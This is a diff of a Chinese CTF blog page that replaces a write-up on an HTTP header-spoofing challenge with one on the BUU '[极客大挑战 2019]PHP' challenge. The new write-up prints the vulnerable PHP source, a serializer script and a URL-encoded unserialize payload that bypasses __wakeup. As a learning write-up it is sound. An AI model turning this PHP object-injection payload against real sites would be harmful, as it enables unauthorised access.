@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题010 - lll-nnnのblog</title>
+  <title>BUU每日一题011 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题010">
+            <span class="h2" id="subtitle" title="BUU每日一题011">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-24 14:07" pubdate>
-        2021年1月24日 下午
+      <time datetime="2021-01-25 16:32" pubdate>
+        2021年1月25日 下午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      266 字
+      823 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      11
        分钟
     </span>
   
@@ -224,17 +224,83 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题010</h1>
+            <h1 style="display: none">BUU每日一题011</h1>
             
             <div class="markdown-body">
-              <h2 id="十、"><a href="#十、" class="headerlink" title="十、"></a>十、</h2><ul>
-<li>题目：[极客大挑战 2019]Http<br>打开网页    <img src="https://ftp.bmp.ovh/imgs/2021/01/48773f6455d50f52.png" srcset="/img/loading.gif"></li>
-<li>解<br>在源码中发现<code>Secret.php</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/b363b77c699739bc.png" srcset="/img/loading.gif"><br>burp抓包，加上<code>Referer:    https://www.Sycsecret.com</code>值得注意的是<code>:</code>和<code>https://www.Sycsecret.com</code>中间要有四个空格<br><img src="https://ftp.bmp.ovh/imgs/2021/01/458f225deefe3ba1.png" srcset="/img/loading.gif"><br>提示要用<code>Syclover</code>访问，将firefox改为Syclover<br><img src="https://ftp.bmp.ovh/imgs/2021/01/aa2a208a708a3cd6.png" srcset="/img/loading.gif"><br>要在本地才可访问，将IP地址改为<code>127.0.0.1</code><img src="https://ftp.bmp.ovh/imgs/2021/01/305c71705fdf6cee.png" srcset="/img/loading.gif"><br>得到flag          </li>
-<li>知识点<br>几个常见请求头       <blockquote>
-<p><code>Referer</code>:告诉服务器我是从哪个页面链接过来的<br><code>X-Forwarded-For </code>:用来表示 HTTP 请求端真实 IP<br><code>User-Agent:Mozilla/...</code>告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本<br><code>Cookie</code>用来存储一些用户信息以便让服务器辨别用户身份的<br><code>Cache-Control:max-age=10</code> 是通知浏览器10秒之内不要烦我，自己从缓冲区中刷新<br><code>Content-Type</code>:告诉客户端，资源文件的类型，还有字符编码<br><code>Data</code>:服务端发送资源时的服务时间<br><code>Server</code>:服务器和相对应的版本<br><code>Connection</code>:keep-alive告诉客户端服务器的tcp连接是一个长连接            </p>
+              <h2 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h2><h3 id="题目：-极客大挑战-2019-PHP"><a href="#题目：-极客大挑战-2019-PHP" class="headerlink" title="题目：[极客大挑战 2019]PHP"></a>题目：[极客大挑战 2019]PHP</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/01/c09882d30a32c90f.png" srcset="/img/loading.gif">         </p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>网页提示说备份网站，用御剑扫，没扫出来<br>换为<code>dirsearch</code>扫出来一个<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/01/96633462d343eda9.png" srcset="/img/loading.gif"><br>加到url后面<code>http://63f0b170-4c01-4aa2-9608-5d33d689c712.node3.buuoj.cn/www.zip</code>得到一个压缩包，内有五个文件<br>主要内容：<br><code>index.php</code> :    </p>
+<pre><code>    &lt;?php             
+    include &#39;class.php&#39;;          
+    $select = $_GET[&#39;select&#39;];          
+    $res=unserialize(@$select);           
+    ?&gt;         </code></pre>
+<p>GET select参数，反序列化<br><code>class.php</code>:  </p>
+<pre><code>        &lt;?php
+        include &#39;flag.php&#39;;
+
+
+        error_reporting(0);
+
+
+        class Name&#123;
+            private $username = &#39;nonono&#39;;
+            private $password = &#39;yesyes&#39;;
+
+            public function __construct($username,$password)&#123;
+                $this-&gt;username = $username;
+                $this-&gt;password = $password;
+            &#125;
+
+            function __wakeup()&#123;
+                $this-&gt;username = &#39;guest&#39;;
+            &#125;
+
+            function __destruct()&#123;
+                if ($this-&gt;password != 100) &#123;
+                    echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+                    echo &quot;You name is: &quot;;
+                    echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+                    echo &quot;You password is: &quot;;
+                    echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+                    die();
+                &#125;
+                if ($this-&gt;username === &#39;admin&#39;) &#123;
+                    global $flag;
+                    echo $flag;
+                &#125;else&#123;
+                    echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
+                    die();
+
+
+                &#125;
+            &#125;
+        &#125;
+        ?&gt;        </code></pre>
+<p>username为admin；password为100时，输出flag<br>因为传入的select会经过反序列化，所以构造的参数应该经过序列化<br>一位大佬的源码：     </p>
+<pre><code>&lt;?php
+class Name
+&#123;
+    private $username = &quot;yesyesyes&quot;;
+    private $password = &quot;nonono&quot;;
+    public function __construct($username,$password)
+    &#123;
+        $this-&gt;username=$username;
+        $this-&gt;password=$password;
+    &#125;
+&#125;
+$a = new Name(@admin,100);
+//var_dump($a);
+//echo &quot;&lt;br&gt;&quot;;
+$b = serialize($a);
+echo $b.&quot;&lt;br&gt;&quot;;//输出序列化
+echo urlencode($b);//输出url编码后的序列化
+?&gt;            </code></pre>
+<p>还需要绕过<code>_wakeup()</code>,将属性数改为3或者大于3的数字即可         </p>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?select=O%3A4%3A&quot;Name&quot;%3A4%3A&#123;s%3A14%3A&quot;%00Name%00username&quot;%3Bs%3A5%3A&quot;admin&quot;%3Bs%3A14%3A&quot;%00Name%00password&quot;%3Bi%3A100%3B&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/01/9362857e700a46b0.png" srcset="/img/loading.gif">      </p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>php序列化与反序列化</strong>          </p>
+<blockquote>
+<p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>本题中序列化后<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code>  O表示存储的对象（object类型）；4代表对象名称有四个字符，即name；2表示有两个值username和password；s代表string类型；14代表字符串长度；i代表int类型；数值为100。<br><strong>不同属性序列化后的格式</strong><br>private属性序列化的时候格式是 %00类名%00成员名 如testname （test-&gt;类名name-&gt;成员名）；比如本题中，<code>nameusername</code>是12个字母，但前面数字是14，就是因为name和username前面各有一个空字符，url编码为<code>%00</code>;php的<code>urlencode</code>函数可以将空字符编出。<br>protected属性序列化的时候格式是<code> %00*%00</code>成员名 如<code>*name </code>（name-&gt;成员名)<br><strong>魔法函数</strong><br><code>__construct</code> 当一个对象创建时自动调用<br><code>__destruct</code> 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)<br><code>__wakeup </code>使用**unserialse()**函数时会自动调用<br><strong>wakeup函数绕过</strong><br>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</p>
 </blockquote>
-</li>
-</ul>
 
             </div>
             <hr>
@@ -258,18 +324,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/25/BUU011/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题011</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/23/BUU009/">
-                        <span class="hidden-mobile">BUU009</span>
+                      <a href="/2021/01/24/BUU010/">
+                        <span class="hidden-mobile">BUU每日一题010</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
